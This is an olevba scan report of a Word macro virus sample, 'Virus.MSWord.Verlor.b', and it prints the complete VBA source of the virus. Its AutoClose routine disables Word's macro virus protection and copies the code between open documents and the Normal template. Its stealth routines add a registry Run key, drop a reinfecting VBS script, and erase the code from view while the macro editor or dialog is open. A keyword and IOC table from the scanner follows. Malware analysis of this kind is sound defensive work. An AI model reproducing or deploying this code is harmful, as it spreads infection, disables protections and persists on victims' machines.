olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Verlor.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Verlor.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module.bas 
in file: Virus.MSWord.Verlor.b - OLE stream: 'Macros/VBA/Module'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()

'MyName = seNse [aka overlord.a]
'WrittenBy = f0re [UC/Skamwerks/DVC]
'Version = .A (1.2)

On Error Resume Next

windir = Environ("windir")
If Dir(windir & "\tempad.dll") <> "" Then Kill (windir & "\tempad.dll")
If Dir(windir & "\tempnt.dll") <> "" Then Kill (windir & "\tempnt.dll")

Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False

If NormalTemplate.VBProject.VBComponents.Item("Module").CodeModule.Lines(3, 1) <> "'MyName = Overlord" Then
ActiveDocument.VBProject.VBComponents("Module").Export (windir & "\tempad.dll")
NormalTemplate.VBProject.VBComponents.import (windir & "\tempad.dll")
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item("Module").CodeModule.Lines(3, 1) <> "'MyName = Overlord" Then
NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\tempnt.dll")
ActiveDocument.VBProject.VBComponents.import (windir & "\tempnt.dll")
ActiveDocument.SaveAs ActiveDocument.FullName
End If

End Sub
Sub Stealth()
On Error Resume Next

windir = Environ("windir")

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\software\", "RegisteredOwner") = "the Overlord"
System.PrivateProfileString("", "HKEY_CURRENT_USER\software\microsoft\windows\CurrentVersion\run", "Overlord") = windir & "\overlord.vbs"

If Dir(windir & "\overlord.a.vbs") <> "" Then Kill (windir & "\overlord.a.vbs")
If Dir(windir & "\overlord.a.dll") <> "" Then Kill (windir & "\overlord.a.dll")

Open "c:\windows\overlord.a.vbs" For Append As #1
Print #1, "On error resume next"
Print #1, "Set WordObj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "WordObj.Options.SaveNormalPrompt = False"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(" & Chr(34) & "Module" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (" & Chr(34) & windir & "\overlord.a.dll" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, "set NT = nothing"
Print #1, "WordObj.Quit"
Close #1

NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\overlord.a.dll")

End Sub
Sub ViewVBCode()
On Error Resume Next

Call Stealth

For X = 1 To NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
 Code = Code & NormalTemplate.VBProject.VBComponents("Module").CodeModule.Lines(X, 1) & Chr(13)
Next X

NormalTemplate.VBProject.VBComponents("Module").CodeModule.deletelines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
NormalTemplate.Saved = True

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
For X = 1 To Docnumber
Documents(X).VBProject.VBComponents("Module").CodeModule.deletelines 1, Documents(X).VBProject.VBComponents("Module").CodeModule.CountOfLines
Documents(X).Saved = True
Next X
End If

Application.ShowVisualBasicEditor = True

While Application.ShowVisualBasicEditor = True
DoEvents
Wend

NormalTemplate.VBProject.VBComponents("Module").CodeModule.InsertLines 1, Code
NormalTemplate.Save

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
For X = 1 To Docnumber
Documents(X).VBProject.VBComponents("Module").CodeModule.InsertLines 1, Code
Documents(X).SaveAs Documents(X).FullName
Next X
End If

End Sub
Sub ToolsMacro()
On Error Resume Next

For X = 1 To NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
 codeNT = codeNT & NormalTemplate.VBProject.VBComponents("Module").CodeModule.Lines(X, 1) & Chr(13)
Next X
NormalTemplate.VBProject.VBComponents("Module").CodeModule.deletelines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
NormalTemplate.Saved = True

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
 For Y = 1 To ActiveDocument.VBProject.VBComponents("Module").CodeModule.CountOfLines
  CodeAD = CodeAD & ActiveDocument.VBProject.VBComponents("Module").CodeModule.Lines(Y, 1) & Chr(13)
 Next Y
 For X = 1 To Docnumber
 Documents(X).VBProject.VBComponents("Module").CodeModule.deletelines 1, Documents(X).VBProject.VBComponents("Module").CodeModule.CountOfLines
 Documents(X).Saved = True
 Next X
End If

Application.Dialogs(wdDialogToolsMacro).Show

If Application.ShowVisualBasicEditor = False Then
 NormalTemplate.VBProject.VBComponents("Module").CodeModule.InsertLines 1, codeNT
 NormalTemplate.Save
 
If Docnumber >= 1 Then
For X = 1 To Docnumber
Documents(X).VBProject.VBComponents("Module").CodeModule.InsertLines 1, CodeAD
Documents(X).SaveAs Documents(X).FullName
Next X
End If
End If
End Sub

'Put this code in a module called "Module". I created a form of stealth.
'However not full stealth. But it's a nice attempt i think/hope :).


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |tempad.dll          |Executable file name                         |
|IOC       |tempnt.dll          |Executable file name                         |
|IOC       |overlord.vbs        |Executable file name                         |
|IOC       |a.vbs               |Executable file name                         |
|IOC       |a.dll               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

